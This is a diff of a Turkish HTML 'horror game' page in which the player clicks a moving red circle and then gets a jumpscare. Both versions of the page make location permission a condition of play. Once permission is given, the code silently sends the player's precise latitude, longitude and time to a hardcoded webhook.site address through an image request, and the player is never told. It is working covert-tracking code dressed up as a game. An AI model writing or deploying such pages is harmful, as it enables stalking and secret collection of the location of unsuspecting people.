@@ -2,42 +2,44 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Konum Tabanlı Korku Oyunu</title>
+  <title>Korku Oyunu - Konumlu</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     html, body {
       margin: 0;
       padding: 0;
-      background: black;
+      background: #000;
       color: white;
-      font-family: 'Segoe UI', sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      font-family: Arial, sans-serif;
       height: 100vh;
       overflow: hidden;
     }
 
     #permission-screen {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
       text-align: center;
     }
 
     #game-container {
       display: none;
       position: relative;
-      width: 100%;
-      height: 100%;
+      width: 100vw;
+      height: 100vh;
     }
 
     #circle {
       width: 100px;
       height: 100px;
-      background: crimson;
+      background-color: crimson;
       border-radius: 50%;
       position: absolute;
       cursor: pointer;
+      transition: 0.2s;
       box-shadow: 0 0 20px red;
-      transition: all 0.2s ease;
     }
 
     #score-display {
@@ -56,7 +58,8 @@
       background: black;
       justify-content: center;
       align-items: center;
-      z-index: 1000;
+      z-index: 9999;
+      flex-direction: column;
     }
 
     #jumpscare img {
@@ -67,12 +70,23 @@
     audio {
       display: none;
     }
+
+    button {
+      background: crimson;
+      color: white;
+      padding: 12px 24px;
+      font-size: 18px;
+      border: none;
+      cursor: pointer;
+      border-radius: 6px;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
 
 <div id="permission-screen">
-  <h1>Bu oyunu oynamak için konum izni vermen gerekiyor.</h1>
+  <h1>Oyuna başlamak için konum izni vermelisin!</h1>
   <button onclick="requestLocation()">Konum İzni Ver</button>
 </div>
 
@@ -80,7 +94,7 @@
   <div id="score-display">Skor: 0</div>
   <div id="circle" onclick="handleClick()"></div>
   <div id="jumpscare">
-    <img src="https://i.imgur.com/jxKX1U7.png" alt="Scream">
+    <img src="https://i.imgur.com/jxKX1U7.png" alt="Korku">
     <audio id="scream" src="https://www.myinstants.com/media/sounds/wilhelm-scream.mp3" autoplay></audio>
   </div>
 </div>
@@ -88,31 +102,31 @@
 <script>
   function requestLocation() {
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(success, error, {
-        enableHighAccuracy: true
-      });
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          // Konumu Webhook.site adresine gönder
+          const img = new Image();
+          img.src = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34?lat=" + lat + "&lon=" + lon + "&time=" + new Date().toISOString();
+
+          // Oyun başlasın
+          document.getElementById("permission-screen").style.display = "none";
+          document.getElementById("game-container").style.display = "block";
+          randomPosition();
+        },
+        error => {
+          alert("Konum izni vermelisin. Sayfayı yenileyip tekrar dene.");
+        },
+        { enableHighAccuracy: true }
+      );
     } else {
-      alert("Tarayıcın konum desteği vermiyor.");
+      alert("Tarayıcın konum desteği sağlamıyor.");
     }
   }
 
-  function success(position) {
-    const lat = position.coords.latitude;
-    const lon = position.coords.longitude;
-    const img = new Image();
-    img.src = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34?lat=" + lat + "&lon=" + lon + "&t=" + new Date().toISOString();
-
-    document.getElementById("permission-screen").style.display = "none";
-    document.getElementById("game-container").style.display = "block";
-    randomPosition(); // oyun başlasın
-  }
-
-  function error(err) {
-    alert("Konum izni verilmeden oyun başlayamaz.");
-    requestLocation(); // tekrar dener
-  }
-
-  // Oyun fonksiyonları
+  // Oyun değişkenleri
   let score = 0;
   const circle = document.getElementById("circle");
   const scoreDisplay = document.getElementById("score-display");
@@ -120,9 +134,8 @@
   const screamSound = document.getElementById("scream");
 
   function randomPosition() {
-    const container = document.getElementById("game-container");
-    const maxX = container.clientWidth - circle.offsetWidth;
-    const maxY = container.clientHeight - circle.offsetHeight;
+    const maxX = window.innerWidth - circle.offsetWidth;
+    const maxY = window.innerHeight - circle.offsetHeight;
     const x = Math.random() * maxX;
     const y = Math.random() * maxY;
     circle.style.left = x + "px";
